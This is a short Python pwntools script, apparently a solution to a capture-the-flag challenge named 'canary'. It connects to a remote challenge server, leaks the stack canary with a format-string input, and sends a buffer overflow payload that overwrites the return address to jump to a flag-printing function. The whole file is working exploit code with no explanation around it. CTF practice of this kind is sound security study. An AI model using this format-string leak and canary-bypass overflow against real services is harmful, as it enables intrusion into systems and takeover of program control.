from pwn import *

#r = process('./canary')
r = remote('shell.actf.co', 20701)

get_canary = "%17$p"
r.sendlineafter("What's your name? ", get_canary)
r.recvuntil("meet you, ")
canary = int(r.recvline()[:-2], 16)

show_flag = 0x400787

payload = b"A"*0x38
payload += p64(canary)
payload += b"A"*8
payload += p64(show_flag)

r.sendlineafter("tell me?", payload)
r.interactive()
